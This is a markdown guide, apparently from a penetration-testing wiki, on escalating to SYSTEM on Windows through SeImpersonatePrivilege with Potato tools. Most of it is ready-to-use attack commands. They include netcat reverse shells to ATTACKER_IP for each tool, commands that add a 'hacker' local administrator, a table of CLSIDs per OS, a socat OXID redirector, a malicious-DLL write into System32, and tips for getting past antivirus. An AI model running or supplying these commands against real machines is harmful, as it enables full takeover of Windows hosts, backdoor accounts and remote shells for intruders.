---
title: 'SeImpersonate & Potato Attacks'
description: 'Complete guide to exploiting SeImpersonatePrivilege using Potato attacks — GodPotato, PrintSpoofer, JuicyPotato, SweetPotato, EfsPotato, RoguePotato, LocalPotato.'
---

# SeImpersonate & Potato Attacks

## When You See This Privilege

`SeImpersonatePrivilege` is commonly assigned to:

- **IIS Application Pool** accounts (`IIS APPPOOL\DefaultAppPool`)
- **SQL Server** service accounts (`NT Service\MSSQLSERVER`)
- **`LOCAL SERVICE`** and **`NETWORK SERVICE`**
- Any Windows service account

```cmd
:: Check for the privilege
whoami /priv | findstr SeImpersonate
```

---

## How Potato Attacks Work

All Potato attacks follow the same fundamental pattern:

```
┌──────────────────────┐
│ 1. Attacker has       │
│    SeImpersonate      │
│    (service account)  │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ 2. Coerce a SYSTEM   │
│    process to auth    │
│    to attacker's      │
│    listener           │
│    (via DCOM, Spooler,│
│     EFS RPC, etc.)    │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ 3. Capture the SYSTEM │
│    token during auth  │
│    handshake          │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ 4. Impersonate the    │
│    SYSTEM token →     │
│    execute as SYSTEM   │
└──────────────────────┘
```

**Key concept**: The attacker doesn't exploit a vulnerability in the traditional sense. They abuse Windows' own token impersonation mechanism — a legitimate feature that allows services to impersonate clients. The "trick" is coercing a SYSTEM process to authenticate to the attacker's controlled listener, where the attacker captures and reuses the SYSTEM token.

---

## Tool Decision Matrix

| Tool | Target OS | Coercion Mechanism | Notes |
|:-----|:----------|:-------------------|:------|
| **GodPotato** | Win 8–11, Server 2012–2022 | DCOM + RPCSS | ✅ **Widest compatibility — try this first** |
| **PrintSpoofer** | Win 10, Server 2016/2019 | Print Spooler named pipe (`\pipe\spoolss`) | ❌ Fails if Print Spooler is disabled |
| **SweetPotato** | Win 7–11, Server 2008–2022 | Multiple (auto-selects best) | Tries BITS, WinRM, Spooler automatically |
| **JuicyPotato** | Win 7/8/10 (pre-1809), Server 2008/2012/2016 | DCOM CLSID abuse | ❌ Patched on Win 10 1809+ / Server 2019+ |
| **RoguePotato** | Win 10 1809+, Server 2019 | OXID resolver redirect | Requires a controlled machine for OXID resolution |
| **EfsPotato** | Win 10, Server 2016/2019 | EFS RPC (`\pipe\efsrpc`) | Works when Spooler is disabled |
| **LocalPotato** | Win 10/11, Server 2019/2022 (pre-Jan 2023) | NTLM local auth reflection (CVE-2023-21746) | ⚠️ File write only — must chain with DLL hijack |

---

## GodPotato — Best First Choice

Works on the widest range of Windows versions. Uses DCOM/RPCSS coercion.

**Repo**: [github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

```cmd
:: Verify you have the privilege
whoami /priv | findstr SeImpersonate

:: Execute command as SYSTEM
GodPotato.exe -cmd "cmd /c whoami"

:: Reverse shell
GodPotato.exe -cmd "cmd /c C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"

:: Add local admin
GodPotato.exe -cmd "cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add"
```

!!! tip "Stability"
    GodPotato shells can sometimes be unstable. Best practice: use it to execute a secondary reverse shell binary or add a local admin, rather than relying on its direct shell output.

---

## PrintSpoofer

Exploits the Print Spooler service's named pipe. Very reliable when Spooler is running.

**Repo**: [github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

```cmd
:: Check if Print Spooler is running (REQUIRED)
sc query Spooler

:: Interactive SYSTEM shell
PrintSpoofer64.exe -i -c cmd

:: Execute a command
PrintSpoofer64.exe -c "whoami"

:: Reverse shell
PrintSpoofer64.exe -c "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
```

!!! warning "Spooler Must Be Running"
    If you get an error, check `sc query Spooler`. If it's stopped or disabled, use GodPotato or EfsPotato instead.

---

## SweetPotato

Bundles multiple coercion techniques and auto-selects the best one.

**Repo**: [github.com/CCob/SweetPotato](https://github.com/CCob/SweetPotato)

```cmd
:: Launch interactive SYSTEM cmd
SweetPotato.exe -p C:\Windows\System32\cmd.exe

:: Reverse shell
SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"

:: Add local admin
SweetPotato.exe -p C:\Windows\System32\net.exe -a "localgroup administrators hacker /add"
```

SweetPotato automatically tries BITS, WinRM, and Spooler techniques — useful when you don't know which will work.

---

## JuicyPotato — Legacy Systems Only

**Only use on**: Win 7, Win 8, Win 10 builds before 1809, Server 2008, Server 2012, Server 2016.

**Repo**: [github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)

```cmd
:: Basic usage (need a valid CLSID for the target OS)
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe" -t *

:: With specific CLSID
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\temp\out.txt" -t * -c {4991D34B-80A1-4291-83B6-3328366B9097}
```

!!! warning "CLSID Required"
    JuicyPotato needs a valid COM server CLSID for the target OS. If the default CLSID fails, try others from: [ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### Common CLSIDs by OS

| OS | CLSID |
|:---|:------|
| Windows 7 Enterprise | `{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}` |
| Windows 8.1 Enterprise | `{C49E32C6-BC8B-11d2-85D4-00105A1F8304}` |
| Windows 10 Enterprise (1803) | `{4991D34B-80A1-4291-83B6-3328366B9097}` |
| Windows Server 2008 R2 | `{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}` |
| Windows Server 2012 | `{e60687f7-01a1-40aa-86ac-db1cbf673334}` |
| Windows Server 2016 | `{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}` |

---

## EfsPotato

Uses EFSRPC (Encrypting File System Remote Protocol) for coercion. Works when Print Spooler is disabled.

```cmd
EfsPotato.exe "whoami"
EfsPotato.exe "cmd /c C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
```

---

## RoguePotato

Redirects the OXID resolver to a controlled machine. Requires **network-level control** (you need a second machine or IP for the OXID redirect).

**Repo**: [github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)

```cmd
:: On target (redirects OXID to attacker)
RoguePotato.exe -r ATTACKER_IP -e "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe" -l 9999
```

```bash
# On attacker: run the socat redirector
socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999
```

---

## LocalPotato (CVE-2023-21746)

!!! warning "File Write Only — Not Direct Code Execution"
    LocalPotato provides **arbitrary file write** as SYSTEM, not direct command execution. You must chain it with a DLL hijacking technique to achieve SYSTEM.

Patched in **January 2023**. Only works on unpatched systems.

**Repo**: [github.com/decoder-it/LocalPotato](https://github.com/decoder-it/LocalPotato)

### Exploitation Chain: LocalPotato + StorSvc DLL Hijack

```cmd
:: Step 1: Write malicious DLL to System32 via LocalPotato
LocalPotato.exe -i evil.dll -o C:\Windows\System32\SprintCSP.dll

:: Step 2: Trigger StorSvc service to load the DLL
:: (requires a separate RpcClient.exe or similar trigger)
RpcClient.exe
```

---

## SeAssignPrimaryTokenPrivilege

Often paired with `SeImpersonatePrivilege`. Allows assigning a different token to a newly created process.

- All Potato attacks above also work with `SeAssignPrimaryTokenPrivilege`
- Instead of impersonating the captured SYSTEM token, the tool assigns it as the primary token for a new process

---

## Troubleshooting Cheatsheet

| Problem | Solution |
|:--------|:---------|
| GodPotato returns error | Try a different port `-l 1337`, ensure x64 binary on x64 OS |
| PrintSpoofer fails | Check `sc query Spooler` — if disabled, use GodPotato or EfsPotato |
| JuicyPotato fails | Wrong CLSID for OS version, or OS is 1809+ (use GodPotato) |
| Shell is unstable | Use Potato to execute a staged reverse shell binary instead |
| "Access Denied" | Verify `whoami /priv` shows SeImpersonate as **Enabled** |
| Tool is blocked by AV | Try a different Potato variant, or use Meterpreter's `getsystem` |
